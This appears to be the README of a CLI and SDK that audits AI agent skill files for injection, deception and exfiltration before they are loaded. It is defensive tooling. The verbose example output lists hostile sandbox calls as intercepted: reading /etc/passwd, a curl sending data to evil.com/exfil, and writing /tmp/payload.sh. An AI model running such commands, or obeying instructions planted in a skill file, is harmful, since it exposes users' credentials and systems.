# @skillauditor/client

Verify that an AI skill (SKILL.md) is safe before loading it into your agent.

Works as a **CLI tool** (use directly in Claude Code or any terminal) and as a **Node.js SDK** (import into your own agent code).

## Install

```bash
npm install -g @skillauditor/client
```

Or use without installing:

```bash
npx @skillauditor/client verify ./SKILL.md
```

---

## CLI

### Commands

```
skillauditor verify <file>   Audit a skill and wait for the verdict
skillauditor check  <file>   Check if already verified — no submission, no waiting
```

### Options

```
--tier <free|pro>   Audit tier (default: free)
                      free — LLM audit only
                      pro  — full audit + onchain stamp + ENS subname
--key  <0x...>      EVM private key for World AgentKit signing
                      Omit to use dev bypass (local API only)
--api-url <url>     SkillAuditor API base URL (default: http://localhost:3001)
--verbose           Show every sandbox tool call in output
--silent            No output — use exit code only
--no-reject         Exit 0 even if skill is unsafe
--timeout <ms>      Abort after N ms (default: 300000)
--help              Show help
```

### Exit codes

```
0   Safe   — verdict = safe, score >= 70
1   Unsafe — verdict = unsafe or review_required, or audit timed out
2   Error  — bad args, file not found, API unreachable
```

### Examples

```bash
# Audit a skill — pipeline logs stream live to terminal
skillauditor verify ./SKILL.md

# Check if already stamped onchain (instant, no new audit)
skillauditor check ./SKILL.md

# See every sandbox tool call the auditor makes
skillauditor verify ./SKILL.md --verbose

# Pro tier — writes onchain stamp + ENS subname on completion
skillauditor verify ./SKILL.md --tier pro --key 0xYOUR_PRIVATE_KEY

# Silent gate — use in scripts or CI
skillauditor verify ./SKILL.md --silent && echo "safe to load"

# Point at a deployed API
skillauditor verify ./SKILL.md --api-url https://api.skillauditor.xyz
```

### What the output looks like

```
▶  Auditing: GitHub PR Reviewer  [audit-a1b2c3d4]  tier=free

   ✔  Stage 1 — Structural extraction complete
   ✔  Stage 2 — Content analysis complete
   ✔  Stage 3 — Sandbox simulation complete
   ✔  Stage 4 — Verdict synthesis complete

✔  SAFE  score=91/100
```

With `--verbose`, every sandbox tool call is shown as it happens:

```
▶  Auditing: GitHub PR Reviewer  [audit-a1b2c3d4]  tier=free

   ✔  Stage 1 — Structural extraction complete
   ✔  Stage 2 — Content analysis complete
        read_file /etc/passwd → (honeypot) access denied
        bash "curl https://evil.com/exfil?..." → (intercepted) blocked
        write_file /tmp/payload.sh → (honeypot) access denied
   ✔  Stage 3 — Sandbox simulation complete
   ✔  Stage 4 — Verdict synthesis complete

✗  UNSAFE  score=18/100
```

---

## Using in Claude Code

The CLI is designed to work directly inside Claude Code sessions. Ask Claude to run it as a bash tool before loading any skill:

```
Run: skillauditor verify ./SKILL.md
```

Or add it as a pre-flight check in your workflow:

```bash
skillauditor verify ./SKILL.md --silent && load_skill ./SKILL.md
```

---

## Node.js SDK

If you need to verify skills programmatically inside your own agent code:

```bash
npm install @skillauditor/client
```

### Quick start (dev mode)

```ts
import { SkillAuditorClient } from '@skillauditor/client'

const client = new SkillAuditorClient()
const result = await client.verifySkill(skillContent)
// throws SkillRejectedError if verdict != safe or score < 70
```

### Production

```ts
import { SkillAuditorClient } from '@skillauditor/client'

const client = new SkillAuditorClient({
  privateKey:     process.env.AGENT_PRIVATE_KEY,  // EVM key for World AgentKit SIWE
  tier:           'pro',                           // onchain stamp + ENS subname
  paymentHandler: async (req) => wallet.payX402(req),
})

const result = await client.verifySkill(skillContent)
console.log(result.verdict)    // "safe" | "unsafe" | "review_required"
console.log(result.score)      // 0–100
console.log(result.ensSubname) // "a1b2c3d4.skills.skillauditor.eth"
```

### Guard pattern

```ts
if (await client.isSafe(skillContent)) {
  loadSkill(skillContent)
}
```

### Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `apiUrl` | string | `http://localhost:3001` | SkillAuditor API base URL |
| `privateKey` | string | `"dev"` | EVM private key — `"dev"` uses local bypass |
| `tier` | `"free"` \| `"pro"` | `"free"` | Audit tier |
| `paymentHandler` | function | — | Required for `tier: "pro"` in prod |
| `logs` | `true` \| `"verbose"` \| `false` | `true` | Terminal log level |
| `onProgress` | function | — | Custom progress handler (overrides `logs`) |
| `pollIntervalMs` | number | `3000` | Poll interval |
| `timeoutMs` | number | `300000` | Timeout in ms |
| `rejectOnUnsafe` | boolean | `true` | Throw `SkillRejectedError` if unsafe |

### Error handling

```ts
import { SkillRejectedError, AuditTimeoutError, PaymentError } from '@skillauditor/client'

try {
  await client.verifySkill(content)
} catch (err) {
  if (err instanceof SkillRejectedError) {
    console.log(err.verdict, err.score)  // "unsafe", 18
  }
  if (err instanceof AuditTimeoutError) {
    // audit exceeded timeoutMs
  }
  if (err instanceof PaymentError) {
    // x402 payment failed
  }
}
```

### Result shape

```ts
interface VerifyResult {
  verified:     boolean
  verdict:      'safe' | 'unsafe' | 'review_required'
  score:        number           // 0–100
  auditId:      string
  skillHash:    string           // 0x-prefixed SHA-256
  auditedAt:    string           // ISO timestamp
  ensSubname?:  string           // Pro tier only: "a1b2c3d4.skills.skillauditor.eth"
  onchainStamp?: {
    txHash:          string
    chainId:         number
    contractAddress: string
    ensName:         string | null
    stampedAt:       string
  }
}
```

---

## How the audit pipeline works

1. **Structural extraction** — deterministic: SHA-256 hash, frontmatter, declared tools, external URLs
2. **Content analysis** — LLM examines the skill for injection attempts, deception patterns, and exfiltration directives
3. **Sandbox simulation** — skill executed in an isolated mock workstation with honeypot credentials and 16 intercepted tool types
4. **Verdict synthesis** — a final agent scores across 5 safety dimensions and produces a calibrated verdict

The auditor agent never reads raw skill content as instructions — it only sees structured analysis reports from each stage.

---

## Tiers

| | Free | Pro |
|-|------|-----|
| LLM audit (all 4 stages) | ✔ | ✔ |
| Onchain stamp (Base) | — | ✔ |
| ENS subname (`*.skills.skillauditor.eth`) | — | ✔ |
| IPFS audit report | — | ✔ |
| Payment required | No | $1.00 USDC via x402 |
